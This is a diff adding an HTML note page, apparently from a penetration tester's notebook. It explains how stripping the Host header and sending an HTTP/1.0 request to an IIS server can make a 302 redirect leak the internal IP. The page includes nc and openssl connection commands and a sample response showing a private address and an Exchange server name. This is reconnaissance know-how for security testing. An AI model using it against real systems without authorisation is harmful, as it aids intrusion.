@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Internal IP Disclosure</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Internal IP Address Disclosure</h1></strong><br />If you get a <code>302 Moved Temporarily</code> response from an IIS server,<br />you can try stripping the <code>Host</code> header and using HTTP/1.0 inside the response.<br /><br />Without a <code>Host</code> header to point to where you&#39;re trying to connect to, the IIS server might respond with the internal IP address of the web server in the <code>Location</code> header.<br /><br /><strong>Example</strong><br />Send a web request.<br /><div class="codebox"><div class="codebox">nc&nbsp;-v&nbsp;domain.com&nbsp;80<br />openssl&nbsp;s_client&nbsp;-connect&nbsp;domain.com:443</div></div><br /><br />Response disclosing the internal IP:<br /><div class="codebox"><div class="codebox">GET&nbsp;/&nbsp;HTTP/1.0<br /><br />HTTP/1.1&nbsp;302&nbsp;Moved&nbsp;Temporarily<br />Cache-Control:&nbsp;no-cache<br />Pragma:&nbsp;no-cache<br />Location:&nbsp;https://192.168.5.237/owa/<br />Server:&nbsp;Microsoft-IIS/10.0<br />X-FEServer:&nbsp;NHEXCHANGE2016</div></div><br /></div>
+</body>
+</html>
